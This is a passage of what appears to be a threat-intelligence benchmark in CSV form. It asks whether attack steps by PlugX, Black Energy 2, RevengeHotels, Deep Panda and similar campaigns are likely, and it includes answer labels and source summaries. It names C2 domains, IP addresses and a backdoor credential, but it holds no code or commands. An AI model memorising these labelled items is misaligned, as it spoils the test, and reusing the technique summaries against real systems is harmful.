Persistence: The PlugX RAT established persistence through service and run key installation. The configuration included settings for persistence, such as the service name 'sWtDmsuBTyMK', service display name, service description, registry hive, registry key, and registry value. The malware was designed to maintain its foothold on systems across restarts and other interruptions.
Defense Evasion: The PlugX RAT employed sandbox evasion techniques by not executing the payload until the victim closed the decoy Word document. This technique is designed to avoid detection in malware sandbox environments unless configured to simulate user actions. Additionally, the RAR SFX script was created with a Chinese language pack version of WinRAR, indicating an attempt to evade detection based on language or regional settings.
Command and Control: The PlugX RAT communicated with command and control (C2) servers using domains such as pressmil[.]com and notebookhk[.]net. These domains pointed to infrastructure on the IP address '43.252.175.119' in Hong Kong, actively used by the attacker since at least 2014. The C2 infrastructure included multiple domains and was registered using the same registrar in Beijing, 'Shanghai Meicheng Technology Information Development Co., Ltd.'
Others: The campaign by TA459 demonstrates a keen interest in the Russian telecom and military sectors, indicative of an actor with geopolitical motives. The attacker adapts and evolves their tactics, techniques, and procedures (TTPs) over time. Despite not hiding their tracks, they remain highly determined and persistent, with a sustained operation spanning at least two years. The attacker researches the locale and current events relevant to their targets, leveraging this in their targeting tactics. Organizations are advised to adopt next-generation solutions that correlate advanced detection with threat intelligence about actor TTPs and global views of threat traffic, including indicators of compromise (IOCs), to detect and mitigate compromises.",Yes,PlugX-in-Russia
2490,407,407-Execution-T1569-System Services,"After evading defenses by encrypting its payload and employing code compression techniques, is it likely that Black Energy 2 will create a decryptor driver in the system32drivers directory as part of its execution strategy before maintaining persistence by injecting a DLL into the svchost.exe process?","Execution: Cybercriminals use Black Energy 2, detected as Backdoor.Win32.Blakken by Kaspersky Lab, to execute malicious activities on infected computers. The malware hides its code from antivirus products using encryption and code compression, and it infects system processes. Upon execution, Black Energy 2 allocates virtual memory, copies its decryptor code, and passes control to the decryptor, which then places dropper functionality code in memory. A decryptor driver with a random name is created in the system32drivers directory, and a corresponding service is started. The driver acts as a wrapper for the malware's core components.","Persistence: Black Energy 2 maintains persistence by injecting a DLL into the svchost.exe user-mode process. The infector driver, which contains the malicious DLL, locates the svchost.exe process, allocates memory in its address space, and launches the injected library's code using APC queue processing.
Defense Evasion: Black Energy 2 evades defenses by hiding its payload using encryption, code compression, and potentially anti-emulation techniques. The malware's plugins are not executable files and are loaded directly onto an infected machine, which means they may not be distributed using mass propagation techniques, making it harder for antivirus vendors to detect new plugins.
Command and Control: The botnet's command-and-control (C&C) center communicates with Black Energy 2 through HTTP requests. The bot sends a preformed HTTP request containing data that identifies the infected machine. The C&C responds with a bot configuration file, which is an encrypted XML document. The bot can receive general commands from the C&C, such as downloading and executing files, updating the bot, and setting contact frequency with the C&C server.
Impact: Black Energy 2 is primarily used to conduct DDoS attacks. It uses plugins like ddos, syn, and http to initiate mass connections and send random data packets to target servers. The malware can create a significant load on servers, especially when using the http plugin, which imitates an ordinary user visiting a page multiple times in a short period.
Others: Kaspersky Lab has identified over 4,000 modifications of Black Energy 2 since mid-2008. The malware has evolved to include plugins that extend its capabilities beyond DDoS attacks, potentially allowing for spam distribution, credential grabbing, and proxy server setup. Kaspersky Lab continues to monitor the evolution of Black Energy 2 and its plugins to track the threat's progression.",Yes,black-ddos
2493,407,407-Command and Control-T1071-Application Layer Protocol,Is Black Energy 2 likely to inject a DLL into the svchost.exe process to maintain persistence before the botnet's command-and-control center communicates with the malware through HTTP requests?,"Command and Control: The botnet's command-and-control (C&C) center communicates with Black Energy 2 through HTTP requests. The bot sends a preformed HTTP request containing data that identifies the infected machine. The C&C responds with a bot configuration file, which is an encrypted XML document. The bot can receive general commands from the C&C, such as downloading and executing files, updating the bot, and setting contact frequency with the C&C server.","Execution: Cybercriminals use Black Energy 2, detected as Backdoor.Win32.Blakken by Kaspersky Lab, to execute malicious activities on infected computers. The malware hides its code from antivirus products using encryption and code compression, and it infects system processes. Upon execution, Black Energy 2 allocates virtual memory, copies its decryptor code, and passes control to the decryptor, which then places dropper functionality code in memory. A decryptor driver with a random name is created in the system32drivers directory, and a corresponding service is started. The driver acts as a wrapper for the malware's core components.
Persistence: Black Energy 2 maintains persistence by injecting a DLL into the svchost.exe user-mode process. The infector driver, which contains the malicious DLL, locates the svchost.exe process, allocates memory in its address space, and launches the injected library's code using APC queue processing.
Defense Evasion: Black Energy 2 evades defenses by hiding its payload using encryption, code compression, and potentially anti-emulation techniques. The malware's plugins are not executable files and are loaded directly onto an infected machine, which means they may not be distributed using mass propagation techniques, making it harder for antivirus vendors to detect new plugins.
Impact: Black Energy 2 is primarily used to conduct DDoS attacks. It uses plugins like ddos, syn, and http to initiate mass connections and send random data packets to target servers. The malware can create a significant load on servers, especially when using the http plugin, which imitates an ordinary user visiting a page multiple times in a short period.
Others: Kaspersky Lab has identified over 4,000 modifications of Black Energy 2 since mid-2008. The malware has evolved to include plugins that extend its capabilities beyond DDoS attacks, potentially allowing for spam distribution, credential grabbing, and proxy server setup. Kaspersky Lab continues to monitor the evolution of Black Energy 2 and its plugins to track the threat's progression.",Yes,black-ddos
2494,407,407-Impact-T1498-Network Denial of Service,"After Black Energy 2 communicates with its command-and-control server through HTTP requests and receives an encrypted XML configuration file, is it likely to initiate network denial-of-service attacks using DDoS plugins such as ddos, syn, and http to overload target servers?","Impact: Black Energy 2 is primarily used to conduct DDoS attacks. It uses plugins like ddos, syn, and http to initiate mass connections and send random data packets to target servers. The malware can create a significant load on servers, especially when using the http plugin, which imitates an ordinary user visiting a page multiple times in a short period.","Execution: Cybercriminals use Black Energy 2, detected as Backdoor.Win32.Blakken by Kaspersky Lab, to execute malicious activities on infected computers. The malware hides its code from antivirus products using encryption and code compression, and it infects system processes. Upon execution, Black Energy 2 allocates virtual memory, copies its decryptor code, and passes control to the decryptor, which then places dropper functionality code in memory. A decryptor driver with a random name is created in the system32drivers directory, and a corresponding service is started. The driver acts as a wrapper for the malware's core components.
Persistence: Black Energy 2 maintains persistence by injecting a DLL into the svchost.exe user-mode process. The infector driver, which contains the malicious DLL, locates the svchost.exe process, allocates memory in its address space, and launches the injected library's code using APC queue processing.
Defense Evasion: Black Energy 2 evades defenses by hiding its payload using encryption, code compression, and potentially anti-emulation techniques. The malware's plugins are not executable files and are loaded directly onto an infected machine, which means they may not be distributed using mass propagation techniques, making it harder for antivirus vendors to detect new plugins.
Command and Control: The botnet's command-and-control (C&C) center communicates with Black Energy 2 through HTTP requests. The bot sends a preformed HTTP request containing data that identifies the infected machine. The C&C responds with a bot configuration file, which is an encrypted XML document. The bot can receive general commands from the C&C, such as downloading and executing files, updating the bot, and setting contact frequency with the C&C server.
Others: Kaspersky Lab has identified over 4,000 modifications of Black Energy 2 since mid-2008. The malware has evolved to include plugins that extend its capabilities beyond DDoS attacks, potentially allowing for spam distribution, credential grabbing, and proxy server setup. Kaspersky Lab continues to monitor the evolution of Black Energy 2 and its plugins to track the threat's progression.",Yes,black-ddos
2501,41,41-Collection-T1056-Input Capture,"After capturing credentials from compromised hotel systems and online travel agencies to sell to other cybercriminals, is it likely that the malware used in the RevengeHotels campaign will monitor documents sent to the printer to collect credit card data?","Collection: The malware used in these campaigns is designed to collect credit card data by monitoring the clipboard and documents sent to the printer, as hotel personnel often handle credit card information from OTA websites.","Initial Access: RevengeHotels is a cybercrime campaign targeting the hospitality sector, including hotels and tourism companies, primarily in Brazil but also worldwide. The main attack vector is spear-phishing emails with malicious Word, Excel, or PDF attachments, some exploiting CVE-2017-0199. The emails contain well-crafted social engineering content, often impersonating legitimate companies using typo-squatting domains. The attached documents use template injection to execute macro code, which in turn downloads and executes malware such as RevengeRAT, NjRAT, NanoCoreRAT, 888 RAT, and ProCC.
Execution: The malware downloaded in the RevengeHotels campaign are .NET binaries protected with Yoda Obfuscator, which unpack to reveal commercial RATs like RevengeRAT. An additional module called ScreenBooking captures credit card data by monitoring web pages, specifically targeting booking.com. In the ProCC campaigns, the malware are Delphi binaries with a customized backdoor capable of collecting data from the clipboard and printer spooler, as well as capturing screenshots.
Credential Access: The attackers aim to capture credit card data from hotel systems and online travel agencies. They also sell credentials from compromised systems, providing remote access to hotel front desks infected by the campaign. This allows other cybercriminals to steal credit card details from hotel administration software.
Others: The RevengeHotels campaign has been active since at least 2015, with confirmed victims in multiple countries. The campaign uses traditional RAT malware to infect businesses in the hospitality sector. Kaspersky products detect this threat under various names, and indicators of compromise (IoCs) are available on the Kaspersky Threat Intelligence Portal.",Yes,RevengeHotels_ cybercrime targeting hotel front desks worldwide
2502,41,41-Collection-T1213-Data from Information Repositories,"After attackers leverage spear-phishing emails with malicious document attachments to gain initial access and execute RAT malware like RevengeRAT in the target environment, is it likely that they will collect credit card information from OTA websites during their operations?","Collection: The malware used in these campaigns is designed to collect credit card data by monitoring the clipboard and documents sent to the printer, as hotel personnel often handle credit card information from OTA websites.","Initial Access: RevengeHotels is a cybercrime campaign targeting the hospitality sector, including hotels and tourism companies, primarily in Brazil but also worldwide. The main attack vector is spear-phishing emails with malicious Word, Excel, or PDF attachments, some exploiting CVE-2017-0199. The emails contain well-crafted social engineering content, often impersonating legitimate companies using typo-squatting domains. The attached documents use template injection to execute macro code, which in turn downloads and executes malware such as RevengeRAT, NjRAT, NanoCoreRAT, 888 RAT, and ProCC.
Execution: The malware downloaded in the RevengeHotels campaign are .NET binaries protected with Yoda Obfuscator, which unpack to reveal commercial RATs like RevengeRAT. An additional module called ScreenBooking captures credit card data by monitoring web pages, specifically targeting booking.com. In the ProCC campaigns, the malware are Delphi binaries with a customized backdoor capable of collecting data from the clipboard and printer spooler, as well as capturing screenshots.
Credential Access: The attackers aim to capture credit card data from hotel systems and online travel agencies. They also sell credentials from compromised systems, providing remote access to hotel front desks infected by the campaign. This allows other cybercriminals to steal credit card details from hotel administration software.
Others: The RevengeHotels campaign has been active since at least 2015, with confirmed victims in multiple countries. The campaign uses traditional RAT malware to infect businesses in the hospitality sector. Kaspersky products detect this threat under various names, and indicators of compromise (IoCs) are available on the Kaspersky Threat Intelligence Portal.",Yes,RevengeHotels_ cybercrime targeting hotel front desks worldwide
2504,42,42-Command and Control-T1071-Application Layer Protocol,"After APT3 exploits a zero-day vulnerability disclosed in the Hacking Team data leak via phishing emails to deliver the SHOTPUT backdoor, is it likely that the SHOTPUT backdoor will communicate with hardcoded CnC addresses while GH0ST RAT, delivered by APT18's phishing campaign, calls out to an APT18 CnC address?","Command and Control: APT3's SHOTPUT backdoor communicates with CnC addresses hardcoded into the malware, including psa.perrydale[.]com, link.angellroofing[.]com, 107.20.255.57, and 23.99.20.198. APT18's GH0ST RAT variant calls out to a previously known APT18 CnC address 223.25.233.248.","Initial Access: The FireEye Threat Intelligence team reported that two Chinese APT groups, APT3 and APT18, launched phishing campaigns exploiting a zero-day vulnerability (CVE-2015-5119) disclosed in the Hacking Team data leak. The campaigns targeted multiple industries, including aerospace and defense, construction and engineering, education, energy, health and biotechnology, high tech, non-profit, telecommunications, and transportation. APT3's phishing emails contained URLs that resolved to the IP address 194.44.130.179 and redirected to JavaScript profilers and a malicious Adobe Flash file. This file downloaded an obfuscated GIF with a SHOTPUT payload, a DLL backdoor capable of various system manipulations, communicating over HTTP to hardcoded command and control (CnC) addresses. APT18's phishing emails prompted victims to download a malicious Adobe Flash update, which upon exploitation, delivered a GH0ST RAT variant calling out to a known APT18 CnC address 223.25.233.248.
Others: FireEye Threat Intelligence suggests that both APT3 and APT18 are adaptable and skilled, as evidenced by their quick use of the leaked zero-day vulnerability before it was patched. They likely monitor security research to learn about available exploits and adapt their tactics accordingly. FireEye has observed APT3 modifying its phishing emails and backdoor in response to public research exposure. Both groups have a history of developing or adapting zero-day exploits for planned operations, and the use of data from the Hacking Team leak shows their ability to shift resources to take advantage of new exploits. FireEye recommends applying Adobe's patch for Flash, querying for additional activity by source addresses or email indicators, blocking CnC addresses, and preparing for incident response.",Yes,Demonstrating_Hustle
2508,44,44-Initial Access-T1566-Phishing,"After attackers use spearphishing emails to execute GreyEnergy mini, is it likely that they will map the network and collect passwords with tools like Nmap and Mimikatz before using PsExec and WinExe for lateral movement across the compromised network?","Initial Access: During our tracking of the GreyEnergy group's activity, we have mostly seen the attackers use two initial infection vectors. The first one is relevant for organizations with self-hosted web services. If such a public-facing web service is running on a server that is connected to an internal network, attackers will try to compromise it and then sneak inside the network. The second infection vector is the use of spearphishing emails with malicious attachments. Malicious documents have been dropping ""GreyEnergy mini"", a lightweight first-stage backdoor that does not require administrative privileges. After compromising a computer with GreyEnergy mini, attackers map the network and collect passwords in order to obtain domain administrator privileges. With these privileges, the attackers can control the whole network. The GreyEnergy group uses fairly standard tools for these tasks: Nmap and Mimikatz.","Lateral Movement: The attackers actively use legitimate tools such as SysInternals PsExec and WinExe to perform lateral movement across a compromised network. The WinExe tool is an open-source equivalent to PsExec, but it can be controlled from a Linux computer, for example from a compromised Linux web server.",Yes,ESET_GreyEnergy
2509,44,44-Initial Access-T1078-Valid Accounts,"After using spearphishing emails with malicious attachments to gain initial access, is it likely that the attackers will map the network and collect passwords to obtain domain administrator privileges before using tools like SysInternals PsExec and WinExe for lateral movement?","Initial Access: During our tracking of the GreyEnergy group's activity, we have mostly seen the attackers use two initial infection vectors. The first one is relevant for organizations with self-hosted web services. If such a public-facing web service is running on a server that is connected to an internal network, attackers will try to compromise it and then sneak inside the network. The second infection vector is the use of spearphishing emails with malicious attachments. Malicious documents have been dropping ""GreyEnergy mini"", a lightweight first-stage backdoor that does not require administrative privileges. After compromising a computer with GreyEnergy mini, attackers map the network and collect passwords in order to obtain domain administrator privileges. With these privileges, the attackers can control the whole network. The GreyEnergy group uses fairly standard tools for these tasks: Nmap and Mimikatz.","Lateral Movement: The attackers actively use legitimate tools such as SysInternals PsExec and WinExe to perform lateral movement across a compromised network. The WinExe tool is an open-source equivalent to PsExec, but it can be controlled from a Linux computer, for example from a compromised Linux web server.",Yes,ESET_GreyEnergy
2510,44,44-Lateral Movement-T1021-Remote Services,"After compromising a computer using GreyEnergy mini and using tools like Nmap and Mimikatz to map the network and collect credentials, is it likely that the GreyEnergy group will use SysInternals PsExec and WinExe tools to perform lateral movement across a compromised network?","Lateral Movement: The attackers actively use legitimate tools such as SysInternals PsExec and WinExe to perform lateral movement across a compromised network. The WinExe tool is an open-source equivalent to PsExec, but it can be controlled from a Linux computer, for example from a compromised Linux web server.","Initial Access: During our tracking of the GreyEnergy group's activity, we have mostly seen the attackers use two initial infection vectors. The first one is relevant for organizations with self-hosted web services. If such a public-facing web service is running on a server that is connected to an internal network, attackers will try to compromise it and then sneak inside the network. The second infection vector is the use of spearphishing emails with malicious attachments. Malicious documents have been dropping ""GreyEnergy mini"", a lightweight first-stage backdoor that does not require administrative privileges. After compromising a computer with GreyEnergy mini, attackers map the network and collect passwords in order to obtain domain administrator privileges. With these privileges, the attackers can control the whole network. The GreyEnergy group uses fairly standard tools for these tasks: Nmap and Mimikatz.",Yes,ESET_GreyEnergy
2515,45,45-Command and Control-T1071-Application Layer Protocol,"After collecting emails through the creation of a Roundcube managesieve plugin filter, is it likely that the BlueDelta campaign exfiltrated the victim's Roundcube session cookie, address book, and database information before utilizing web protocols for Command and Control activities?","Command and Control: The BlueDelta campaign used web protocols for command and control activities, including the use of standard encoding to communicate with the compromised systems.","Reconnaissance: The BlueDelta campaign involved reconnaissance activities targeting Ukrainian government entities and an organization involved in Ukrainian military aircraft infrastructure upgrade and refurbishment. The campaign exploited vulnerabilities CVE-2020-35730, CVE-2020-12641, and CVE-2021-44026 in Roundcube webmail software to run reconnaissance and exfiltration scripts. These scripts were designed to redirect incoming emails to an actor-controlled email address, perform reconnaissance on the target Roundcube server, and exfiltrate the victim's Roundcube session cookie and address book, along with session and user information from Roundcube's database.
Initial Access: The BlueDelta campaign gained initial access by exploiting the Ukrainian government's Roundcube mail servers using CVE-2020-35730. This was achieved without the need for recipients to engage with the email attachment. The campaign also exploited the Microsoft Outlook zero-day vulnerability CVE-2023-23397 in 2022, which did not require user interaction and was triggered once the vulnerable Outlook client received the malicious email.
Execution: The BlueDelta campaign executed malicious scripts through the exploitation of vulnerabilities in Roundcube webmail software. The scripts redirected victims' future incoming emails to an actor-controlled email address and performed reconnaissance on the target Roundcube server. Additionally, the campaign exploited CVE-2023-23397 in Microsoft Outlook, allowing attackers to authenticate to other services by impersonating a victim.
Defense Evasion: BlueDelta used obfuscation techniques to avoid detection. The campaign involved the use of obfuscated JavaScript files and the deobfuscation of these files to execute the attack. The attackers also used encoded data to communicate with the compromised systems and avoid detection by security mechanisms.
Credential Access: BlueDelta accessed credentials by exploiting the Roundcube webmail software vulnerabilities to dump OS credentials, including /etc/passwd and /etc/shadow files, from the compromised systems.
Discovery: The BlueDelta campaign conducted discovery activities by exploiting vulnerabilities in Roundcube webmail software to gather system information, network configuration, owner/user discovery, and network connections discovery.
Collection: BlueDelta collected emails by creating a filter within Roundcube's managesieve plugin, which automatically forwarded all emails received by the victim to a specified email address controlled by the attackers.
Exfiltration: BlueDelta exfiltrated data over alternative protocols and automated the exfiltration process. The campaign involved the exfiltration of the victim's Roundcube session cookie, address book, and database information.",Yes,BlueDelta Exploits Ukrainian Government Roundcube Mail Servers to Support Espionage Activities
2521,45,45-Discovery-T1049-System Network Connections Discovery,"After accessing credentials by exploiting Roundcube webmail vulnerabilities to dump OS credentials such as /etc/passwd and /etc/shadow files, is it likely that the BlueDelta campaign will exploit vulnerabilities in Roundcube webmail software to perform discovery activities, including system information and network connections discovery, before collecting emails by creating a filter within Roundcube's managesieve plugin to forward them to an actor-controlled email address?","Discovery: The BlueDelta campaign conducted discovery activities by exploiting vulnerabilities in Roundcube webmail software to gather system information, network configuration, owner/user discovery, and network connections discovery.","Reconnaissance: The BlueDelta campaign involved reconnaissance activities targeting Ukrainian government entities and an organization involved in Ukrainian military aircraft infrastructure upgrade and refurbishment. The campaign exploited vulnerabilities CVE-2020-35730, CVE-2020-12641, and CVE-2021-44026 in Roundcube webmail software to run reconnaissance and exfiltration scripts. These scripts were designed to redirect incoming emails to an actor-controlled email address, perform reconnaissance on the target Roundcube server, and exfiltrate the victim's Roundcube session cookie and address book, along with session and user information from Roundcube's database.
Initial Access: The BlueDelta campaign gained initial access by exploiting the Ukrainian government's Roundcube mail servers using CVE-2020-35730. This was achieved without the need for recipients to engage with the email attachment. The campaign also exploited the Microsoft Outlook zero-day vulnerability CVE-2023-23397 in 2022, which did not require user interaction and was triggered once the vulnerable Outlook client received the malicious email.
Execution: The BlueDelta campaign executed malicious scripts through the exploitation of vulnerabilities in Roundcube webmail software. The scripts redirected victims' future incoming emails to an actor-controlled email address and performed reconnaissance on the target Roundcube server. Additionally, the campaign exploited CVE-2023-23397 in Microsoft Outlook, allowing attackers to authenticate to other services by impersonating a victim.
Defense Evasion: BlueDelta used obfuscation techniques to avoid detection. The campaign involved the use of obfuscated JavaScript files and the deobfuscation of these files to execute the attack. The attackers also used encoded data to communicate with the compromised systems and avoid detection by security mechanisms.
Credential Access: BlueDelta accessed credentials by exploiting the Roundcube webmail software vulnerabilities to dump OS credentials, including /etc/passwd and /etc/shadow files, from the compromised systems.
Collection: BlueDelta collected emails by creating a filter within Roundcube's managesieve plugin, which automatically forwarded all emails received by the victim to a specified email address controlled by the attackers.
Command and Control: The BlueDelta campaign used web protocols for command and control activities, including the use of standard encoding to communicate with the compromised systems.
Exfiltration: BlueDelta exfiltrated data over alternative protocols and automated the exfiltration process. The campaign involved the exfiltration of the victim's Roundcube session cookie, address book, and database information.",Yes,BlueDelta Exploits Ukrainian Government Roundcube Mail Servers to Support Espionage Activities
2531,47,47-Persistence-T1547-Boot or Logon Autostart Execution,"After gaining initial access through Japanese language fake documents, is it likely that BLACKGEAR’s malware tools will move to the Windows temp folder and create shortcut files in the startup folder to maintain Persistence before retrieving encrypted C&C configuration information from blogs or microblogs for Command and Control?","Persistence: The malware tools used by BLACKGEAR, such as binders, downloaders, and backdoors, employ persistent methods to ensure their continued presence on infected machines. This includes moving to the Windows temp folder and creating shortcut files in the startup folder to maintain Persistence.","Reconnaissance: The BLACKGEAR espionage campaign, authored by Trend Micro researchers Joey Chen and MingYen Hsieh, has been known to use blogs and microblogging services to conceal the location of its command-and-control (C&C) servers, a technique that falls under the Reconnaissance tactic. This method allows the threat actor to quickly change the C&C servers by updating the information in these posts.
Initial Access: The BLACKGEAR campaign has evolved to target Japanese users, indicated by the use of fake documents in Japanese as part of its infection routines. This suggests the campaign's Initial Access tactic now includes crafting documents in the target's native language to increase the chances of successful infiltration.
Command and Control: The backdoors used by BLACKGEAR, such as BKDR_ELIRKS and BKDR_YMALR, retrieve encrypted C&C configuration information from blogs or microblogs, which is a key aspect of the Command and Control tactic. They connect to these C&C servers and wait for commands from the threat actor.
Others: The BLACKGEAR campaign uses a variety of tools that are categorized into binders, downloaders, and backdoors. These tools are designed to be adaptable and replaceable, allowing the threat actors to quickly respond to detection and blocking efforts. The campaign has shown connections between different tools, such as shared strings and decryption keys, indicating a coordinated set of malware families. Trend Micro continues to monitor BLACKGEAR's activities to protect customers.",Yes,"TrendLabs Security Intelligence BlogBLACKGEAR Espionage Campaign Evolves, Adds Japan To Target List - TrendLabs Security Intelligence Blog"
2533,48,48-Initial Access-T1190-Exploit Public-Facing Application,"After Deep Panda exfiltrates data over the C2 channel using the Milestone backdoor, is it likely that the threat actor previously ensured initial access by exploiting the Log4Shell vulnerability in VMware Horizon servers?","Initial Access: Deep Panda gained initial access through the exploitation of the Log4Shell vulnerability in VMware Horizon servers. This allowed them to spawn new PowerShell processes to download and execute a chain of scripts, culminating in the installation of a malicious DLL.","Resource Development: During the past month, FortiEDR detected a campaign by Deep Panda, a Chinese APT group, which exploited the Log4Shell vulnerability in VMware Horizon servers. The group targeted multiple sectors, including financial, academic, cosmetics, and travel industries, across several countries. Deep Panda deployed a backdoor on infected machines and used a stolen digital certificate, also utilized by another Chinese APT group, Winnti, to sign their tools.
Execution: The attack chain involved the execution of PowerShell scripts and a batch file to download and run additional files, including syn.exe and 1.dll. The 1.dll module, dubbed Milestone, is a backdoor based on Gh0st RAT/Netbot Attacker's leaked source code and packed with Themida. It creates a service named msupdate2 and masquerades as the legitimate Microsoft newdev.dll.
Persistence: The Milestone backdoor ensures persistence by copying itself to %APPDATA%\newdev.dll and creating a service named msupdate2 directly in the registry. This service is registered with various names and descriptions across different samples.
Privilege Escalation: The 2016 version of the Milestone backdoor creates a new administrator user with the username ANONYMOUS and password MileSt0ne2@16, executes another instance of itself with CreateProcessAsUser, and then removes the user from the system.
Defense Evasion: Deep Panda's campaign involved the use of a novel kernel rootkit, Fire Chili, which hides and protects malicious artifacts, including files, processes, registry keys, and network connections. The rootkit uses Direct Kernel Object Modification (DKOM) and is signed with stolen certificates from game development companies. It also employs Themida for software packing and masquerading techniques to evade detection.
Discovery: The Milestone backdoor has capabilities for system information discovery, file and directory discovery, and screen capture.
Command and Control: The Milestone backdoor communicates with a C2 server uncompressed, unlike the zlib-compressed communication of Gh0st RAT. It also supports a command that sends information about the current sessions on the system to the server.
Exfiltration: The Milestone backdoor exfiltrates data over the C2 channel.
Others: The campaign's attribution to Deep Panda and Winnti is based on the use of the Milestone backdoor, previously known as Infoadmin RAT, and the Fire Chili rootkit, both of which share similarities with tools used by these groups in the past. The use of stolen certificates and C2 infrastructure suggests possible resource sharing between the groups. FortiEDR detects and blocks these threats, and all network IOCs have been added to the FortiGuard WebFiltering blocklist.",Yes,New Milestones for Deep Panda_ Log4Shell and Digitally Signed Fire Chili Rootkits
2535,48,48-Defense Evasion-T1014-Rootkit,"After gaining persistence through the Milestone backdoor by copying itself to %APPDATA%\newdev.dll and creating a service named msupdate2 directly in the registry, is Deep Panda likely to use the Fire Chili rootkit for defense evasion, which employs Direct Kernel Object Modification (DKOM) to protect malicious artifacts?","Defense Evasion: Deep Panda's campaign involved the use of a novel kernel rootkit, Fire Chili, which hides and protects malicious artifacts, including files, processes, registry keys, and network connections. The rootkit uses Direct Kernel Object Modification (DKOM) and is signed with stolen certificates from game development companies. It also employs Themida for software packing and masquerading techniques to evade detection.","Resource Development: During the past month, FortiEDR detected a campaign by Deep Panda, a Chinese APT group, which exploited the Log4Shell vulnerability in VMware Horizon servers. The group targeted multiple sectors, including financial, academic, cosmetics, and travel industries, across several countries. Deep Panda deployed a backdoor on infected machines and used a stolen digital certificate, also utilized by another Chinese APT group, Winnti, to sign their tools.
Initial Access: Deep Panda gained initial access through the exploitation of the Log4Shell vulnerability in VMware Horizon servers. This allowed them to spawn new PowerShell processes to download and execute a chain of scripts, culminating in the installation of a malicious DLL.
Execution: The attack chain involved the execution of PowerShell scripts and a batch file to download and run additional files, including syn.exe and 1.dll. The 1.dll module, dubbed Milestone, is a backdoor based on Gh0st RAT/Netbot Attacker's leaked source code and packed with Themida. It creates a service named msupdate2 and masquerades as the legitimate Microsoft newdev.dll.
Persistence: The Milestone backdoor ensures persistence by copying itself to %APPDATA%\newdev.dll and creating a service named msupdate2 directly in the registry. This service is registered with various names and descriptions across different samples.
Privilege Escalation: The 2016 version of the Milestone backdoor creates a new administrator user with the username ANONYMOUS and password MileSt0ne2@16, executes another instance of itself with CreateProcessAsUser, and then removes the user from the system.
Discovery: The Milestone backdoor has capabilities for system information discovery, file and directory discovery, and screen capture.
Command and Control: The Milestone backdoor communicates with a C2 server uncompressed, unlike the zlib-compressed communication of Gh0st RAT. It also supports a command that sends information about the current sessions on the system to the server.
Exfiltration: The Milestone backdoor exfiltrates data over the C2 channel.
Others: The campaign's attribution to Deep Panda and Winnti is based on the use of the Milestone backdoor, previously known as Infoadmin RAT, and the Fire Chili rootkit, both of which share similarities with tools used by these groups in the past. The use of stolen certificates and C2 infrastructure suggests possible resource sharing between the groups. FortiEDR detects and blocks these threats, and all network IOCs have been added to the FortiGuard WebFiltering blocklist.",Yes,New Milestones for Deep Panda_ Log4Shell and Digitally Signed Fire Chili Rootkits
2537,48,48-Defense Evasion-T1574-Hijack Execution Flow,"After the Milestone backdoor ensures persistence by copying itself to %APPDATA%\newdev.dll and creating a service named msupdate2 in the registry, is Deep Panda likely to deploy the Fire Chili kernel rootkit to achieve Defense Evasion by using Direct Kernel Object Modification (DKOM) before proceeding with system information discovery and screen capture functionalities?","Defense Evasion: Deep Panda's campaign involved the use of a novel kernel rootkit, Fire Chili, which hides and protects malicious artifacts, including files, processes, registry keys, and network connections. The rootkit uses Direct Kernel Object Modification (DKOM) and is signed with stolen certificates from game development companies. It also employs Themida for software packing and masquerading techniques to evade detection.","Resource Development: During the past month, FortiEDR detected a campaign by Deep Panda, a Chinese APT group, which exploited the Log4Shell vulnerability in VMware Horizon servers. The group targeted multiple sectors, including financial, academic, cosmetics, and travel industries, across several countries. Deep Panda deployed a backdoor on infected machines and used a stolen digital certificate, also utilized by another Chinese APT group, Winnti, to sign their tools.
Initial Access: Deep Panda gained initial access through the exploitation of the Log4Shell vulnerability in VMware Horizon servers. This allowed them to spawn new PowerShell processes to download and execute a chain of scripts, culminating in the installation of a malicious DLL.
Execution: The attack chain involved the execution of PowerShell scripts and a batch file to download and run additional files, including syn.exe and 1.dll. The 1.dll module, dubbed Milestone, is a backdoor based on Gh0st RAT/Netbot Attacker's leaked source code and packed with Themida. It creates a service named msupdate2 and masquerades as the legitimate Microsoft newdev.dll.
Persistence: The Milestone backdoor ensures persistence by copying itself to %APPDATA%\newdev.dll and creating a service named msupdate2 directly in the registry. This service is registered with various names and descriptions across different samples.
Privilege Escalation: The 2016 version of the Milestone backdoor creates a new administrator user with the username ANONYMOUS and password MileSt0ne2@16, executes another instance of itself with CreateProcessAsUser, and then removes the user from the system.
Discovery: The Milestone backdoor has capabilities for system information discovery, file and directory discovery, and screen capture.
Command and Control: The Milestone backdoor communicates with a C2 server uncompressed, unlike the zlib-compressed communication of Gh0st RAT. It also supports a command that sends information about the current sessions on the system to the server.
Exfiltration: The Milestone backdoor exfiltrates data over the C2 channel.
Others: The campaign's attribution to Deep Panda and Winnti is based on the use of the Milestone backdoor, previously known as Infoadmin RAT, and the Fire Chili rootkit, both of which share similarities with tools used by these groups in the past. The use of stolen certificates and C2 infrastructure suggests possible resource sharing between the groups. FortiEDR detects and blocks these threats, and all network IOCs have been added to the FortiGuard WebFiltering blocklist.",Yes,New Milestones for Deep Panda_ Log4Shell and Digitally Signed Fire Chili Rootkits
2538,48,48-Defense Evasion-T1036-Masquerading,"After the Milestone backdoor ensures persistence by creating a service named msupdate2 directly in the registry, is it likely that Deep Panda will use the Fire Chili rootkit packed with Themida for defense evasion?","Defense Evasion: Deep Panda's campaign involved the use of a novel kernel rootkit, Fire Chili, which hides and protects malicious artifacts, including files, processes, registry keys, and network connections. The rootkit uses Direct Kernel Object Modification (DKOM) and is signed with stolen certificates from game development companies. It also employs Themida for software packing and masquerading techniques to evade detection.","Resource Development: During the past month, FortiEDR detected a campaign by Deep Panda, a Chinese APT group, which exploited the Log4Shell vulnerability in VMware Horizon servers. The group targeted multiple sectors, including financial, academic, cosmetics, and travel industries, across several countries. Deep Panda deployed a backdoor on infected machines and used a stolen digital certificate, also utilized by another Chinese APT group, Winnti, to sign their tools.
Initial Access: Deep Panda gained initial access through the exploitation of the Log4Shell vulnerability in VMware Horizon servers. This allowed them to spawn new PowerShell processes to download and execute a chain of scripts, culminating in the installation of a malicious DLL.
Execution: The attack chain involved the execution of PowerShell scripts and a batch file to download and run additional files, including syn.exe and 1.dll. The 1.dll module, dubbed Milestone, is a backdoor based on Gh0st RAT/Netbot Attacker's leaked source code and packed with Themida. It creates a service named msupdate2 and masquerades as the legitimate Microsoft newdev.dll.
Persistence: The Milestone backdoor ensures persistence by copying itself to %APPDATA%\newdev.dll and creating a service named msupdate2 directly in the registry. This service is registered with various names and descriptions across different samples.
